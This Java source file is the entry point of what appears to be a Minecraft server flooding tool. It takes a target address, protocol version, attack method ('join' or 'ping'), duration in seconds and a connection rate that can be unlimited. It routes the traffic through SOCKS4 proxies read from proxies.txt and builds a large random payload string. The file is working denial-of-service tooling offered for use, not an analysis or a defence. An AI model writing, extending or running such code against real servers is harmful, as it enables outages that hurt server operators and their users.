package IO.SYVERIS;

import IO.SYVERIS.methods.Method;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import IO.SYVERIS.utils.ServerAddress;
import java.io.BufferedReader;
import java.io.File;
import java.net.InetAddress;
import java.util.Random;
import java.util.Scanner;

public class Main {
   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;
   public static int protocolLength;
   public static String methodID;
   public static Method method;
   public static int duration;
   public static int targetCPS;
   public static int nettyThreads;
   public static int loopThreads;
   public static String string;
   public static File proxyFile;
   public static BufferedReader proxyScrape;
   public static ProxyLoader proxies;

   public static void main(String[] args) throws Throwable {
      System.out.println("");
      System.out.println("");
      System.out.println("By orkkz");
      System.out.println("Github: https://github.com/orkkz");
      System.out.println("");
      System.out.println("");
      if (args.length != 5) {
         System.err.println("[ERROR] Correct usage: java -jar " + (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getName() + " <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>");
         System.err.println("");
         System.err.println("<IP:PORT>       - IP and port             | Example: 1.1.1.1:25565 or mc.myservergovno.com");
         System.err.println("<PROTOCOL>      - Protocol version of the server        | Example: 47 or 340");
         System.err.println("<METHOD>        - Method | Example: join or ping");
         System.err.println("<SECONDS>       - How long should the attack last (in seconds)       | Example: 60");
         System.err.println("<TARGETCPS>     - Max connections       | Example: 1000 or 50000 (-1 for no restriction)");
         System.err.println("");
         System.err.println("Exiting...");
      } else {
         System.out.println("Loading proxies...");
         (new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            String msg = "";

            do {
               msg = scanner.next().toLowerCase();
            } while(!msg.equals("fs") && !msg.equals("forcestop") && !msg.equals("s") && !msg.equals("stop") && !msg.equals("fk") && !msg.equals("forcekill"));

            scanner.close();
            System.out.println("\u001b[0;31m Please wait few sec force shutting down....");
            System.exit(0);
         })).start();
         proxyFile = new File("proxies.txt");
         if (!proxyFile.exists()) {
            System.err.println("[ERROR] File proxies.txt not found!");
            System.err.println("");
            System.err.println("File proxies.txt must contain a list of SOCKS4 proxies. Double check or create your own proxies.txt");
            System.err.println("");
            System.err.println("Exiting...");
         } else {
            proxies = new ProxyLoader(proxyFile);

            try {
               System.out.println("Checking IP...");
               ServerAddress sa = ServerAddress.getAddrss(args[0]);
               srvRecord = sa.getIP();
               port = sa.getPort();
               resolved = InetAddress.getByName(srvRecord);
               System.out.println("Checking IP: " + resolved.getHostAddress());
               origIP = args[0].split(":")[0];
               protcolID = Integer.parseInt(args[1]);
               methodID = args[2];
               duration = Integer.parseInt(args[3]);
               targetCPS = Integer.parseInt(args[4]) + (int)Math.ceil((double)(Integer.parseInt(args[4]) / 100 * (50 + Integer.parseInt(args[4]) / 5000)));
               nettyThreads = targetCPS == -1 ? 256 : (int)Math.ceil(6.4E-4D * (double)targetCPS);
               loopThreads = targetCPS == -1 ? 3 : (int)Math.ceil(1.999960000799984E-5D * (double)targetCPS);
               protocolLength = protcolID > 128 ? 3 : 2;
               Random r = new Random();

               for(int i = 1; i < 65536; ++i) {
                  string = string + String.valueOf((char)(r.nextInt(125) + 1));
               }
            } catch (Exception var4) {
               var4.printStackTrace();
               Thread.sleep(5000L);
               return;
            }

            Methods.setupMethods();
            method = Methods.getMethod(methodID);
            NettyBootstrap.start();
         }
      }
   }
}
